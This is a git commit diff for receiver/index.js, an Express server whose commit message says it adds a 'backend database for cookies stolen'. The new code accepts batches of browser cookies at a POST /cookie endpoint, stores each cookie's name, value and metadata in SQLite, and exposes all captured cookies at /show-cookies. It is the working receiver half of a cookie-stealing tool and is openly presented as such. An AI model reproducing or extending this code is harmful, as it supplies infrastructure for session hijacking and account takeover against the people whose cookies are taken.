050ab99e23cafe3e9819f696475d0669f9a05101
Razin Idzuddin <razin99@gmail.com>
2021-04-11 16:39:17 +1000

    added backend databse for cookies stolen

--- receiver/index.js
+++ receiver/index.js
@@ -2,18 +2,41 @@ const express = require("express");
 const app = express();
 const port = 6900;
 
+const sqlite3 = require("sqlite3");
+const db = new sqlite3.Database(":memory");
+db.run(
+  "CREATE TABLE cookie (userId CHAR(10) NOT NULL, name VARCHAR DEFAULT '', value VARCHAR DEFAULT '', metadata VARCHAR DEFAULT '')"
+);
+/*
+  CREATE TABLE cookie (
+	userId CHAR(10) NOT NULL,
+	name VARCHAR DEFAULT '',
+	value VARCHAR DEFAULT '',
+	metadata VARCHAR DEFAULT '',
+  )
+  */
+
 app.use(express.json());
 
-app.get("/", (req, res) => {
-  res.send(JSON.stringify(req.query));
+app.get("/show-cookies", (req, res) => {
+  db.all("SELECT * FROM cookie", [], (err, rows) => {
+    if (err) {
+      console.log(err);
+    } else {
+      res.send(JSON.stringify(rows));
+    }
+  });
   console.log(req.query);
 });
 
 app.post("/cookie", (req, res) => {
   res.send(JSON.stringify(req.body.data));
   if (!checkID(req.headers.uid)) return; //verify UID
-  req.body.data.forEach(cookie => {
-    console.log(cookie.name, " :", cookie.value);
+  req.body.data.forEach((cookie) => {
+    db.run(
+      "INSERT INTO cookie (userId, name, value, metadata) VALUES (?, ?, ?, ?)",
+      [req.headers.uid, cookie.name, cookie.value, getMetadata(cookie)]
+    );
   });
 });
 
@@ -22,8 +45,16 @@ app.listen(port, () => {
 });
 
 function checkID(uid) {
-  console.log(uid);
   return uid ? uid.length === 10 : false;
+}
+
+function getMetadata(cookie) {
+  let meta = {};
+  for (const key in cookie) {
+    if (key === "name" || key === "value") continue;
+    meta[key] = cookie[key];
+  }
+  return JSON.stringify(meta);
 }
 
 /**
